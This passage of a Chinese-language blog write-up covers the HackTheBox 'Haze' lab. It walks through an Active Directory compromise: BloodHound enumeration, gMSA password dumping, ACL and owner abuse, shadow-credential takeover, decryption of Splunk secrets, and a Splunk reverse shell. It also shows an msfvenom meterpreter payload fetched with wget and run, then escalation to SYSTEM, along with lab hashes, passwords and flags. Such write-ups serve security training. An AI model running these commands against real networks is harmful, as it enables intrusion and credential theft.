                                 \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents> \n</code></pre>\n<h2>域内信息收集</h2>\n<p>上传<code>SharpHound</code>进行域内信息收集</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents> upload ../../Tools/BloodHound-linux-x64/resources/app/Collectors/SharpHound.exe                                                          \n                                        \nInfo: Uploading /root/Desktop/test/Haze/../../Tools/BloodHound-linux-x64/resources/app/Collectors/SharpHound.exe to C:\\Users\\mark.adams\\Documents\\SharpHound.exe\n                                        \nData: 1395368 bytes of 1395368 bytes copied\n                                        \nInfo: Upload successful!\n\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents> ./SharpHound.exe -c all\n2025-03-31T09:22:29.6650145-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound\n2025-03-31T09:22:29.7900186-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-03-31T09:22:29.8056473-07:00|INFORMATION|Initializing SharpHound at 9:22 AM on 3/31/2025\n2025-03-31T09:22:29.9150180-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller <span class=\"hljs-keyword\">for</span> haze.htb : dc01.haze.htb\n2025-03-31T09:22:30.0557183-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-03-31T09:22:30.1650235-07:00|INFORMATION|Beginning LDAP search <span class=\"hljs-keyword\">for</span> haze.htb\n2025-03-31T09:22:30.1962697-07:00|INFORMATION|Producer has finished, closing LDAP channel\n2025-03-31T09:22:30.2119118-07:00|INFORMATION|LDAP channel closed, waiting <span class=\"hljs-keyword\">for</span> consumers\n2025-03-31T09:23:00.3681410-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 37 MB RAM\n2025-03-31T09:23:14.7118901-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller <span class=\"hljs-keyword\">for</span> haze.htb : dc01.haze.htb\n2025-03-31T09:23:14.9306620-07:00|INFORMATION|Consumers finished, closing output channel\nClosing writers\n2025-03-31T09:23:14.9618914-07:00|INFORMATION|Output channel closed, waiting <span class=\"hljs-keyword\">for</span> output task to complete\n2025-03-31T09:23:15.0087652-07:00|INFORMATION|Status: 100 objects finished (+100 2.272727)/s -- Using 45 MB RAM\n2025-03-31T09:23:15.0087652-07:00|INFORMATION|Enumeration finished <span class=\"hljs-keyword\">in</span> 00:00:44.8366245\n2025-03-31T09:23:15.0556437-07:00|INFORMATION|Saving cache with stats: 60 ID to <span class=\"hljs-built_in\">type</span> mappings.\n 59 name to SID mappings.\n 0 machine sid mappings.\n 2 sid to domain mappings.\n 0 global catalog mappings.\n2025-03-31T09:23:15.0712709-07:00|INFORMATION|SharpHound Enumeration Completed at 9:23 AM on 3/31/2025! Happy Graphing!\n\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents> download 20250331092314_BloodHound.zip\n</code></pre>\n<p>BloodHound 分析</p>\n<p>mark 属于 <code>Domain users</code>，<code>GMSA_managers</code>，<code>REMOTE_managent_users</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image66.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image67.png\" alt=\"image.png\"></p>\n<h2>GMSA 组利用 &#x26; 域分析</h2>\n<p>查看组<code>GMSA_managers</code>的权限</p>\n<p>如果 <code>GMSA_managers</code> 具有读取 gMSA 密码的权限，可以尝试 <strong>获取 gMSA 账户的密码</strong>，然后使用该账户进行访问。</p>\n<p>查看域中所有<code>gMSA</code>账户</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\program files> Get-ADServiceAccount -Filter *  \n                                                               \nDistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\nEnabled           : True                       \nName              : Haze-IT-Backup                  \nObjectClass       : msDS-GroupManagedServiceAccount  \nObjectGUID        : 66f8d593-2f0b-4a56-95b4-01b326c7a780\nSamAccountName    : Haze-IT-Backup$ \nSID               : S-1-5-21-323145914-28650650-2368316563-1111\nUserPrincipalName :      \n</code></pre>\n<p>检查可访问<code>gMAS</code>账户</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\program files> Get-ADServiceAccount -Filter * | Select-Object Name,DistinguishedName  \n\nName           DistinguishedName\n----           -----------------\nHaze-IT-Backup CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\n</code></pre>\n<p>查看一下 <strong><code>Haze-IT-Backup</code></strong> gMSA 允许哪些用户读取密码</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\program files> Get-ADServiceAccount -Identity <span class=\"hljs-string\">\"Haze-IT-Backup\"</span> -Properties PrincipalsAllowedToRetrieveManagedPassword\n\nDistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\nEnabled                                    : True\nName                                       : Haze-IT-Backup\nObjectClass                                : msDS-GroupManagedServiceAccount\nObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780\nPrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb}\nSamAccountName                             : Haze-IT-Backup$\nSID                                        : S-1-5-21-323145914-28650650-2368316563-1111\nUserPrincipalName                          :\n</code></pre>\n<p>只允许<code>Domain Admins</code> 组的用户</p>\n<p>思路断了，根据提示，<code>MARK</code>用户拥有修改**<code>PrincipalsAllowedToRetrieveManagedPassword</code>** 的权限</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\program files> Set-ADServiceAccount -Identity Haze-IT-Backup$ -PrincipalsAllowedToRetrieveManagedPassword <span class=\"hljs-string\">\"mark.adams\"</span>\n*Evil-WinRM* PS C:\\program files> Get-ADServiceAccount -Identity Haze-IT-Backup$ -Properties PrincipalsAllowedToRetrieveManagedPassword\n\nDistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\nEnabled                                    : True\nName                                       : Haze-IT-Backup\nObjectClass                                : msDS-GroupManagedServiceAccount\nObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780\nPrincipalsAllowedToRetrieveManagedPassword : {CN=Mark Adams,CN=Users,DC=haze,DC=htb}\nSamAccountName                             : Haze-IT-Backup$\nSID                                        : S-1-5-21-323145914-28650650-2368316563-1111\nUserPrincipalName      \n</code></pre>\n<p>设置后通过<code>gMASDumper</code>来获取<code>Haze-IT-Backup$</code>密码</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  python3 gMSADumper.py -u mark.adams -p <span class=\"hljs-string\">'Ld@p_Auth_Sp1unk@2k24'</span> -d haze.htb -l haze.htb\nUsers or <span class=\"hljs-built_in\">groups</span> <span class=\"hljs-built_in\">who</span> can <span class=\"hljs-built_in\">read</span> password <span class=\"hljs-keyword\">for</span> Haze-IT-Backup$:\n > mark.adams\nHaze-IT-Backup$:::735c02c6b2dc54c3c8c6891f55279ebc\nHaze-IT-Backup$:aes256-cts-hmac-sha1-96:38c90a95f7e038a6cb57d3e21c405c2875e88f1edbb1e082f1dd75d01eda60fd\nHaze-IT-Backup$:aes128-cts-hmac-sha1-96:0926f5e64d85018a506ecadff3df4f95\n</code></pre>\n<p>PS：哪里可以知道<code>MARK</code> 拥有修改**<code>PrincipalsAllowedToRetrieveManagedPassword</code>** 的权限？</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\<span class=\"hljs-built_in\">users</span>\\mark.adams\\documents> Import-Module .\\PowerView.ps1\n*Evil-WinRM* PS C:\\<span class=\"hljs-built_in\">users</span>\\mark.adams\\documents> Find-InterestingDomainAcl -ResolveGUIDs\n\nObjectDN                : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\nAceQualifier            : AccessAllowed\nActiveDirectoryRights   : WriteProperty\nObjectAceType           : ms-DS-GroupMSAMembership\nAceFlags                : None\nAceType                 : AccessAllowedObject\nInheritanceFlags        : None\nSecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1107\nIdentityReferenceName   : gMSA_Managers\nIdentityReferenceDomain : haze.htb\nIdentityReferenceDN     : CN=gMSA_Managers,CN=Users,DC=haze,DC=htb\nIdentityReferenceClass  : group\n</code></pre>\n<p>还能看到<code>Haze-IT-Backup$</code>对<code>Support_Services</code>拥有<code>WriteOwner</code>权限</p>\n<pre><code class=\"hljs language-bash\">ObjectDN                : CN=Support_Services,CN=Users,DC=haze,DC=htb\nAceQualifier            : AccessAllowed\nActiveDirectoryRights   : WriteOwner\nObjectAceType           : None\nAceFlags                : None\nAceType                 : AccessAllowed\nInheritanceFlags        : None\nSecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1111\nIdentityReferenceName   : Haze-IT-Backup$\nIdentityReferenceDomain : haze.htb\nIdentityReferenceDN     : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\nIdentityReferenceClass  : computer\n</code></pre>\n<p>从<code>BloodHound</code>中也能看出来</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image68.png\" alt=\"image.png\"></p>\n<p>使用<code>Haze-IT-Backup$</code> 获得的哦凭据来使用<code>BloodHound</code>来收集信息</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  bloodhound-python -u <span class=\"hljs-string\">'Haze-IT-Backup$'</span> -d <span class=\"hljs-string\">'haze.htb'</span> -ns 10.10.11.61 --zip -c All -dc <span class=\"hljs-string\">'dc01.haze.htb'</span> --hashes <span class=\"hljs-string\">'0926f5e64d85018a506ecadff3df4f95:735c02c6b2dc54c3c8c6891f55279ebc'</span>\nINFO: Found AD domain: haze.htb\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: dc01.haze.htb\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: dc01.haze.htb\nINFO: Found 9 <span class=\"hljs-built_in\">users</span>\nINFO: Found 57 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 20 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.haze.htb\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 17S\nINFO: Compressing output into 20250331073045_bloodhound.zip\n</code></pre>\n<p>有一条路径可以修改<code>EDWARD.MARTIN</code> 的密码（失败的尝试）</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image69.png\" alt=\"image.png\"></p>\n<p>跟着<code>BloodHound</code>提示走，修改<code>SUPPORT_SERVICES</code> 的所有者从<code>Domain admins</code>修改为<code>Haze-IT-Backup$</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  owneredit.py -action write -target <span class=\"hljs-string\">'SUPPORT_SERVICES'</span> -new-owner <span class=\"hljs-string\">'Haze-IT-Backup$'</span> haze.htb/<span class=\"hljs-string\">'Haze-IT-Backup$'</span> -hashes <span class=\"hljs-string\">':735c02c6b2dc54c3c8c6891f55279ebc'</span> -dc-ip 10.10.11.61\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Current owner information below\n[*] - SID: S-1-5-21-323145914-28650650-2368316563-512\n[*] - sAMAccountName: Domain Admins\n[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=haze,DC=htb\n[*] OwnerSid modified successfully!\n</code></pre>\n<p>赋予自己<code>SUPPORT_SERVICES</code> 完全权限</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  dacledit.py -action write -target <span class=\"hljs-string\">'SUPPORT_SERVICES'</span> -rights FullControl -principal <span class=\"hljs-string\">'Haze-IT-Backup$'</span> haze.htb/<span class=\"hljs-string\">'Haze-IT-Backup$'</span> -hashes <span class=\"hljs-string\">':735c02c6b2dc54c3c8c6891f55279ebc'</span> -dc-ip 10.10.11.61\n\n[*] DACL backed up to dacledit-20250331-080046.bak\n[*] DACL modified successfully\n</code></pre>\n<p>修改密码….失败</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  pth-net rpc password <span class=\"hljs-string\">\"edward.martin\"</span> <span class=\"hljs-string\">'Aa118811'</span> -U <span class=\"hljs-string\">\"haze.htb\"</span>/<span class=\"hljs-string\">\"Haze-IT-Backup$\"</span>%<span class=\"hljs-string\">\"0926f5e64d85018a506ecadff3df4f95\"</span>:<span class=\"hljs-string\">\"735c02c6b2dc54c3c8c6891f55279ebc\"</span> -S <span class=\"hljs-string\">\"dc01.haze.htb\"</span>\nE_md4hash wrapper called.\nHASH PASS: Substituting user supplied NTLM HASH...\nFailed to <span class=\"hljs-built_in\">set</span> password <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'edward.martin'</span> with error: Access is denied..\n</code></pre>\n<p>再寻找别的路子，发现<code>SUPPORT_SERVICES</code>还对matin拥有<code>AddKeyCredentialLink</code>属性</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image70.png\" alt=\"image.png\"></p>\n<p>可以使用<code>pywhisker</code>给目标账户添加**<code>msDS-KeyCredentialLink</code>** 属性然后进行密钥登陆，而无需密码</p>\n<p>要先将<code>Haze-IT-Backup$</code>添加到组，先获取其<code>TGT</code>票据</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  ntpdate -s 10.10.11.61  \n⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  getTGT.py haze.htb/<span class=\"hljs-string\">'Haze-IT-Backup$'</span> -hashes <span class=\"hljs-string\">'0926f5e64d85018a506ecadff3df4f95'</span>:<span class=\"hljs-string\">'735c02c6b2dc54c3c8c6891f55279ebc'</span> -dc-ip 10.10.11.61\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> Haze-IT-Backup$.ccache\n⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  <span class=\"hljs-built_in\">export</span> KRB5CCNAME=Haze-IT-Backup.ccache         \n</code></pre>\n<p>再通过<code>bloodyAD</code>将自己添加<code>SUPPORT_SERVICES</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  python3 bloodyAD.py --host dc01.haze.htb -d haze.htb -u <span class=\"hljs-string\">\"Haze-IT-Backup$\"</span> -k add groupMember <span class=\"hljs-string\">\"SUPPORT_SERVICES\"</span> <span class=\"hljs-string\">\"Haze-IT-Backup$\"</span>                                                              \n[+] Haze-IT-Backup$ added to SUPPORT_SERVICES\n</code></pre>\n<p>通过<code>pywhisker</code>给目标账户添加**<code>msDS-KeyCredentialLink</code>** 属性，运行成功后生成了 PFX 证书（<code>mdpJu0Mx.pfx</code>）用于 <strong>PKINIT</strong> 认证，提示我们可以使用<code>PKINITtools</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools/Domain/pywhisker/pywhisker  python3 pywhisker.py -d haze.htb -u <span class=\"hljs-string\">\"Haze-IT-Backup$\"</span> -H <span class=\"hljs-string\">\"0926f5e64d85018a506ecadff3df4f95\"</span>:<span class=\"hljs-string\">\"735c02c6b2dc54c3c8c6891f55279ebc\"</span> --target <span class=\"hljs-string\">\"edward.martin\"</span> --action <span class=\"hljs-string\">\"add\"</span>\n[*] Searching <span class=\"hljs-keyword\">for</span> the target account\n[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating KeyCredential\n[*] KeyCredential generated with DeviceID: f529684c-94a0-f254-102e-022b29257375\n[*] Updating the msDS-KeyCredentialLink attribute of edward.martin\n[+] Updated the msDS-KeyCredentialLink attribute of the target object\n[*] Converting PEM -> PFX with cryptography: mdpJu0Mx.pfx\n[+] PFX exportiert nach: mdpJu0Mx.pfx\n[i] Passwort für PFX: 9A16naTa46UFxd15fGWs\n[+] Saved PFX (#PKCS12) certificate &#x26; key at path: mdpJu0Mx.pfx\n[*] Must be used with password: 9A16naTa46UFxd15fGWs\n[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools\n</code></pre>\n<p>使用<code>PKINITtools</code>通过<code>pfx</code>证书生成<code>TGT</code> ，并将其导入到环境变量</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools/Domain/PKINITtools  python3 gettgtpkinit.py haze.htb/edward.martin -cert-pfx ../pywhisker/pywhisker/mdpJu0Mx.pfx -pfx-pass 9A16naTa46UFxd15fGWs martin.ccache\n2025-04-01 05:36:57,751 minikerberos INFO     Loading certificate and key from file\nINFO:minikerberos:Loading certificate and key from file\n2025-04-01 05:36:57,857 minikerberos INFO     Requesting TGT\nINFO:minikerberos:Requesting TGT\n2025-04-01 05:37:06,040 minikerberos INFO     AS-REP encryption key (you might need this later):\nINFO:minikerberos:AS-REP encryption key (you might need this later):\n2025-04-01 05:37:06,040 minikerberos INFO     c0ca345d16085d5058f66534cef843377b461bda39976dced6b9b2ab332b3aaf\nINFO:minikerberos:c0ca345d16085d5058f66534cef843377b461bda39976dced6b9b2ab332b3aaf\n2025-04-01 05:37:06,049 minikerberos INFO     Saved TGT to file\nINFO:minikerberos:Saved TGT to file\n</code></pre>\n<p>因为<code>martin</code>在远程组里面，可以通过<code>winrm</code>进行连接</p>\n<p>首先创建<code>realm</code>文件</p>\n<pre><code class=\"hljs language-bash\">[libdefaults]\n    default_realm = HAZE.HTB\n    dns_lookup_realm = <span class=\"hljs-literal\">true</span>\n    dns_lookup_kdc = <span class=\"hljs-literal\">true</span>\n\n[realms]\n    HAZE.HTB = {\n        kdc = dc01.haze.htb\n        admin_server = dc01.haze.htb\n        default_domain = dc01.haze.htb\n    }\n\n[domain_realm]\n    haze.htb = HAZE.HTB\n    .haze.htb = HAZE.HTB\n</code></pre>\n<p>使用<code>evil-winrm</code>进行登录，登录成功</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools/Domain/PKINITtools  evil-winrm -i dc01.haze.htb -r haze.htb   \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\edward.martin\\Documents> \n</code></pre>\n<p>获得user.txt</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\edward.martin\\desktop> <span class=\"hljs-built_in\">type</span> user.txt\nf907cd5fe75b817de491a3d82b730c63\n</code></pre>\n<h2>提权</h2>\n<p><code>BloodHound</code>分析</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image71.png\" alt=\"image.png\"></p>\n<p>没找到可以利用的的方法，翻找一下文件，因为是<code>backup_reviewers</code>组的成员</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\edward.martin\\Documents> <span class=\"hljs-built_in\">cd</span> ../../../backups\n*Evil-WinRM* PS C:\\backups> <span class=\"hljs-built_in\">ls</span>\n\n    Directory: C:\\backups\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          3/5/2025  12:33 AM                Splunk\n</code></pre>\n<p><code>Splunk</code>的备份，Dump出来</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  evil-winrm -i dc01.haze.htb -r haze.htb\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\edward.martin\\Documents> download ../../../backups/splunk\n                                        \nInfo: Downloading C:\\Users\\edward.martin\\Documents\\../../../backups/splunk to splunk\n                                        \nInfo: Download successful!\n</code></pre>\n<p>解压后检索敏感信息</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/Haze/splunk/Splunk  grep -m1 -rE <span class=\"hljs-string\">'pass'</span> ./\n</code></pre>\n<p>发现<code>bindDNpassword</code>和之前获得不一样了</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image72.png\" alt=\"image.png\"></p>\n<p>像是 <code>alexander.green</code> 的凭据</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze/splunk/Splunk  <span class=\"hljs-built_in\">cat</span> var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf \n[default]\n\nminPasswordLength = 8\nminPasswordUppercase = 0\nminPasswordLowercase = 0\nminPasswordSpecial = 0\nminPasswordDigit = 0\n\n[Haze LDAP Auth]\n\nSSLEnabled = 0\nanonymous_referrals = 1\nbindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb\nbindDNpassword = $1<span class=\"hljs-variable\">$YDz8WfhoCWmf6aTRkA</span>+QqUI=\ncharset = utf8\nemailAttribute = mail\nenableRangeRetrieval = 0\ngroupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb\ngroupMappingAttribute = dn\ngroupMemberAttribute = member\ngroupNameAttribute = cn\nhost = dc01.haze.htb\nnestedGroups = 0\nnetwork_timeout = 20\npagelimit = -1\nport = 389\nrealNameAttribute = cn\nsizelimit = 1000\ntimelimit = 15\nuserBaseDN = CN=Users,DC=haze,DC=htb\nuserNameAttribute = samaccountname\n\n[authentication]\nauthSettings = Haze LDAP Auth\nauthType = LDAP#                               \n</code></pre>\n<p>再使用<code>Splunk.Secret</code>来解密，这里使用的<code>Splunk.Secret</code> 是备份文件夹下面的</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze/splunk/Splunk/etc/auth  splunksecrets splunk-decrypt -S splunk.secret --ciphertext <span class=\"hljs-string\">'$1$YDz8WfhoCWmf6aTRkA+QqUI='</span>\n/root/.local/share/pipx/venvs/splunksecrets/lib/python3.12/site-packages/splunksecrets.py:48: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms <span class=\"hljs-keyword\">in</span> 48.0.0.\n  algorithm = algorithms.ARC4(key)\nSp1unkadmin@2k24\n</code></pre>\n<p>获得密码<code>Sp1unkadmin@2k24</code></p>\n<p>在<code>BloodHound</code>中查看Alexander的信息，Alexander是<code>SPLUNK_ADMINS</code>的成员，应该可以登录<code>WEB</code>端</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image73.png\" alt=\"image.png\"></p>\n<p>尝试<code>admin:Sp1unkadmin@2k24</code> 成功进入后台</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image74.png\" alt=\"image.png\"></p>\n<p>通过搜索引擎检索，Splunk 后台貌似拥有安装自定义应用反弹<code>Shell</code>的方法，这里也存在上传页面，可以进行尝试</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image75.png\" alt=\"image.png\"></p>\n<p>(PS:一开始尝试了<a href=\"https://github.com/TBGSecurity/splunk_shells%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%91%E7%8E%B0%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E6%90%9C%E7%B4%A2\">https://github.com/TBGSecurity/splunk_shells，然后发现无法执行搜索</a>..)</p>\n<p>通过工具来获得<code>shell</code>：<a href=\"https://github.com/0xjpuff/reverse_shell_splunk\">https://github.com/0xjpuff/reverse_shell_splunk</a></p>\n<p>照着流程走即可</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  /usr/share/windows-resources/powersploit/Recon  nc -lvp 4444\nlistening on [any] 4444 ...\nconnect to [xxxxxxx] from haze.htb [10.10.11.61] 64713\n<span class=\"hljs-built_in\">whoami</span>\nhaze\\alexander.green\nPS C:\\Windows\\system32> \n</code></pre>\n<p>我们将他传到MSF，先创建 payload</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  msfvenom -p windows/meterpreter/reverse_tcp lhost=xxxxxxx lport=4443 -f exe -o shell.exe\nWarning: KRB5CCNAME environment variable not supported - unsetting\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No <span class=\"hljs-built_in\">arch</span> selected, selecting <span class=\"hljs-built_in\">arch</span>: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\nSaved as: shell.exe\n ⚡ root@kali  ~/Desktop/test/Haze  python -m http.server 8081\nServing HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...\n</code></pre>\n<p>MSF 监听</p>\n<pre><code class=\"hljs language-bash\">msf6 > use exploit/multi/handler \n[*] Using configured payload windows/meterpreter/reverse_tcp                  \nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport 4443                                                                                                                 \nlport => 4443                                                                                                                                                \nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost xxxxx\nmsf6 exploit(multi/handler) > run\n</code></pre>\n<p>靶机拉取</p>\n<pre><code class=\"hljs language-bash\">PS C:\\<span class=\"hljs-built_in\">users</span>\\alexander.green\\desktop> wget xxxxxxx:8081/shell.exe -o shell.exe\nPS C:\\<span class=\"hljs-built_in\">users</span>\\alexander.green\\desktop> <span class=\"hljs-built_in\">dir</span>\n\n    Directory: C:\\<span class=\"hljs-built_in\">users</span>\\alexander.green\\desktop\n\nMode                 LastWriteTime         Length Name                                                                 \n----                 -------------         ------ ----                                                                 \n-a----          4/1/2025   7:35 AM          73802 shell.exe                                                            \n\nPS C:\\<span class=\"hljs-built_in\">users</span>\\alexander.green\\desktop> ./shell.exe\n</code></pre>\n<p>MSF 就能接收到 <code>shell</code> 了</p>\n<pre><code class=\"hljs language-bash\">msf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on xxxxxxx:4443 \n[*] Sending stage (177734 bytes) to 10.10.11.61\n[*] Meterpreter session 1 opened (xxxxxxx:4443 -> 10.10.11.61:64026) at 2025-04-01 10:35:34 -0400\n\nmeterpreter > \n</code></pre>\n<p>尝试提权，直接成了</p>\n<pre><code class=\"hljs language-bash\">meterpreter > getsystem\n...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">C:\\Users\\Administrator\\Desktop><span class=\"hljs-built_in\">type</span> root.txt\n<span class=\"hljs-built_in\">type</span> root.txt\n72c2d39ecedd0b40f3d8be2721d52748\n</code></pre>\n<h2>总结</h2>\n<p>好玩，涉及的域渗透知识很多，不懂的也很多，学习到了gMSA组的利用，以及**<code>KeyCredentialLink</code>** 获得用户TGT，还有很多的思路。没提示的话感觉会倒在枚举用户名的那块。比前几期的域机器体验好多了;D</p>","title":"HackTheBox - Season7-Haze","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["HackTheBox","域渗透","Windows靶机"],"categories":"靶机","description":"Season7-Haze\n\n https://app.hackthebox.com/competitive/7/overview | `Hard` | `Windows`\n \n\n前期踩点\n\n使用 `nmap` 进行扫描\n\n\n\n添加域名`haze.htb` 和 `dc01.haze.htb`\n\n\n\n尝试枚举 SMB 和 LDAP 匿名\n\n\n\n访问 `8000` 端口，运行的是`Splunk-Ente..."},"recentPosts":[{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"},{"id":"TheHackersLabsBlackGold","title":"TheHackersLabs - BlackGold","date":"2025-07-15","isEncrypted":false,"year":"2025","month":"07","day":"15"},{"id":"TheHackersLabsSedition","title":"TheHackersLabs - Sedition","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","isEncrypted":true,"year":"2025","month":"07","day":"13"}]},"__N_SSG":true}